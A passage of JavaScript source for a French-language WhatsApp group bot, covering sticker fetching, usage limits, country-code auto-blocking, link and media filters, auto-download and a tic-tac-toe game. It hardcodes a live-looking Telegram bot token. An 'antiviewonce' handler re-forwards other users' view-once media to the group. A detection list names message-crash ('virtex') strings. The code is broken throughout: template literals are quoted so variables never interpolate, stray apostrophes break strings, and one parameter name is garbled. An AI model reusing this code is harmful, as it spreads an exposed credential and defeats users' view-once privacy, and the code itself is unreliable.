function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygckev('Veuillez saisir l.url de votre sticker Telegram')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios('https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}', {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const kevinouresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios('https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}')
            result = {
            status: 200,
            author: 'Kenvofc',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            kevinouresult.push(result)
        }
    resolve(kevinouresult)
    })
}
//gos telechargement
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return '${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}';
}
        
        //limite fonc
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygckev('You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit')
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitkev = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitkev
            }
            Kev.sendText('120363167338947238@g.us', { text: 'Reinitialisation de la limite'})
        }
        // Grupe uniquement
        if (!m.isGroup && !KevTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygckev('Hey! pour eviter des risques de spam veuillez utiliser le bot dans un groupe de discussion\n\nVeuillez contacter le proprio si cela vous est impossible wa.me/${ownernumber}')
            }
        }
        // dm uniquement 
        if (!KevTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygckev("Hey! Veuillez utiliser le bot dans une conversation privee")
	     }
	}
	     
        if (!Kev.public) {
            if (KevTheCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	Kev.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            Kev.readMessages([m.key])
        }
        //bio automatique\\
	if (db.data.settings[botNumber].autobio) {
            Kev.updateProfileStatus('${botname} Online depuis ${runtime(process.uptime())}').catch(_ => _)
        }
     //enregistrement/ecritures auto
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let kevmix = ['composing', 'recording']
            kevmix2 = kevmix[Math.floor(kevmix.length * Math.random())]
            Kev.sendPresenceUpdate(kevmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let kevmix = ['recording']
            kevmix2 = kevmix[Math.floor(kevmix.length * Math.random())]
            Kev.sendPresenceUpdate(kevmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let kevpos = ['composing']
            Kev.sendPresenceUpdate(kevpos, from)
        }
        }
        
        //blocage automatique 
        if (m.sender.startsWith('${autoblocknumber}') && db.data.settings[botNumber].autoblocknum === true) {
            return Kev.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('237') && db.data.settings[botNumber].onlycmr === true) {
            return Kev.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('229') && db.data.settings[botNumber].onlybnin === true) {
            return Kev.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith('${antiforeignnumber}') && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (KevTheCreator || isAdmins || !isBotAdmins) return
            Kev.sendMessage(m.chat, { text: 'Sorry Vous serez off parce que l.admin a activey l.anti foreign dans ce groupe, seuls les +${antiforeignnumber} sont autoriseys a rejoindre le groupe' }, {quoted: m})
            await sleep(2000)
            await Kev.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await Kev.getName(i),
	    	vcard: 'BEGIN:VCARD\nVERSION:3.0\nN:${await Kev.getName(i)}\nFN:${await Kev.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD'
	    })
	}
        //console log
        if (isCommand) {
            console.log(color('\n�������������������������������\n', 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }

        //antivue unique
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Kev.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
    
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && kev_antispam.isFiltered(from)) {
console.log('[SPAM]', color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color('${command} [${args.length}]'), 'from', color(m.pushName))
return await Kev.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match('instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install')) {
if (!isBotAdmins) return
if(KevTheCreator) return
if (isAdmins) return
Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
Kev.sendMessage(from, {text:'\'\'\'「 Promotion Detectee 」\'\'\'\n\n@${m.sender.split("@")[0]} a fait une promotion et le random concerney a ete demis', contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygckev('*VIRTEX DETECTEY*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Kev.sendText(m.chat, '*MARQUEY COMME LU *\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus send ici par👇:* \nwa.me/${sender.split("@")[0]}')   
if (!isBotAdmins) return
if(KevTheCreator) return
Kev.groupParticipantsUpdate(from, [sender], 'remove')
await Kev.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
Kev.sendMessage('${ownernumber}@s.whatsapp.net',{text: 'Hey Proprio! wa.me/${sender.split("@")[0]} Detectey  avoir send un virtex merdique ${isGroup?'dans ${groupName}':''}'})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          replygckev('*Bot merdique detectey*\n\nHusshhh met toi dehors !!!')
    return await Kev.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isKevMedia) {
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Media Detectey 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti media dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && KevMedia) {
    if(isKevMedia === "imageMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Image Detectee 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti image dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isKevMedia) {
    if(isKevMedia === "videoMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Video Detectee 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti video dans ce groupe ')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isKevMedia) {
    if(isKevMedia === "stickerMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Sticker Detectey 」\'\'\'\n\nSorry,mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti sticker dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isKevMedia) {
    if(isKevMedia === "audioMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Audio Detectey 」\'\'\'\n\nSorry, mais j'l.suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti audio dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isKevMedia) {
    if(isKevMedia === "pollCreationMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Poll Detectey 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti poll dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isKevMedia) {
    if(isKevMedia === "locationMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Localisation Detectee 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti localisation dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isKevMedia) {
    if(isKevMedia === "documentMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Document Detectey 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti document dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isKevMedia) {
    if(isKevMedia === "contactMessage"){
        if (KevTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygckev('\'\'\'「 Contact Detectey 」\'\'\'\n\nSorry, mais j'suis dans l.obligation de supprimer cela, Parce que l.admin a activey l.anti contact dans ce groupe')
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kev.sendMessage(from, {text:'\'\'\'「 Gros mot detectey 」\'\'\'\n\n@${m.sender.split("@")[0]} a dit un gros mot et sont message a ete supprimey', contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //telechargement auto #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
if (budy.match('instagram.com')) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson('https://api.junn4.my.id/download/instagram?url=${budy}')
Kev.sendMessage(m.chat, { video: { url: anu.result.media}, caption: 'Telechargement Auto ✅'}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match('tiktok.com')) {
await Kev.msendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson('https://api.junn4.my.id/download/tiktok?url=${budy}')
Kev.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: 'Telechargement Auto ✅'}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match('facebook.com')) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson('https://api.junn4.my.id/download/facebook?url=${budy}')
Kev.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: 'Telechargement Auto ✅'}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match('youtube.com|youtu.be')) {
await Kev.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson('https://api.junn4.my.id/download/ytmp4?url=${budy}')
Kev.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ''}, {quoted: m})
await Kev.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await Kev.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
        
        //sticker auto
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                Kev.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log('Auto sticker detected')
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                Kev.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match('chat.whatsapp.com')) {
               bvl = '\'\'\'「 Lien De Groupe Detectey 」\'\'\'\n\nUn admin a send un lien. les admins peuvent envoyer des liens no stress 😇'
if (isAdmins) return replygckev(bvl)
if (m.key.fromMe) return replygckev(bvl)
if (KevTheCreator) return replygckev(bvl)
               await Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kev.sendMessage(from, {text:'\'\'\'「 Lien De Groupe Detectey 」\'\'\'\n\nLe random @${m.sender.split("@")[0]} a send un lien merdique et ce lien a ete supprimey', contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = '\'\'\'「 Lien Detectey 」\'\'\'\n\nUn admin a send un lien. les admins peuvent envoyer des liens no stress😇'
if (isAdmins) return replygckev(bvl)
if (m.key.fromMe) return replygckev(bvl)
if (KevTheCreator) return replygckev(bvl)
               await Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kev.sendMessage(from, {text:'\'\'\'「 Lien Detectey 」\'\'\'\n\nLe random @${m.sender.split("@")[0]} a send un lien merdique et ce lien a ete supprimey ', contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            replygckev('Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}'.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            replygckev('You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}'.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//nombre total des commandes 
const kevfeature = () =>{
            var mytext = fs.readFileSync("./SylversBot.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //terechargement encours #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await Kev.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        Kev.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygckev('*Encours de telechargement...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await Kev.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        Kev.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygckev('*Encours de telechargement...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        //reponse auto
for (let BhosdikaKev of VoiceNoteKev) {
if (budy === BhosdikaKev) {
let audiobuffy = fs.readFileSync('./KenvFile/audio/${BhosdikaKev}.mp3')
Kev.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaKev of StickerKev){
if (budy === BhosdikaKev){
let stickerbuffy = fs.readFileSync('./KenvFile/sticker/${BhosdikaKev}.webp')
Kev.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaKev of ImageKev){
if (budy === BhosdikaKev){
let imagebuffy = fs.readFileSync('./KenvFile/image/${BhosdikaKev}.jpg')
Kev.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaKev of VideoKev){
if (budy === BhosdikaKev){
let videobuffy = fs.readFileSync('./KenvFile/video/${BhosdikaKev}.mp4')
Kev.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
Kev.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaKev of ApkKev) {
if (budy === BhosdikaKev) {
let buffer = fs.readFileSync('./KenvFile/apk/${BhosdikaKev}.apk')
sendapk(buffer)
}
}

const sendzip = (teks) => {
Kev.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaKev of ZipKev) {
if (budy === BhosdikaKev) {
let buffer = fs.readFileSync('./KenvFile/zip/${BhosdikaKev}.zip')
sendzip(buffer)
}
}

const senddocu = (teks) => {
Kev.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaKev of DocKev) {
if (budy === BhosdikaKev) {
let buffer = fs.readFileSync('./KenvFile/doc/${BhosdikaKev}.pdf')
senddocu(buffer)
}
}

// ajouter une reponse a la liste
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Kev.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Kev.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// repondre a la commande avec un media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: Kev.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Kev.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
Kev.ev.emit('messages.upsert', msg)
} 

//============= [LISTE DES REPONSES ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return Kev.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygckev('🎮 Math Quiz 🎮\n\nReponse Correcte 🎉\n\nVoulez-vous jouer a nouveau ? Send ${prefix}math mode')
                delete kuismath[m.sender.split('@')[0]]
            } else replygckev('*Mauvaise Reponse !*')
        }
        
        //JEUX
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygckev('[DEBUG]\n${parseInt(m.text)}')
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygckev({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = 'Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? '@${winner.split('@')[0]} Won!' : isTie ? 'Game over' : 'Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})'}
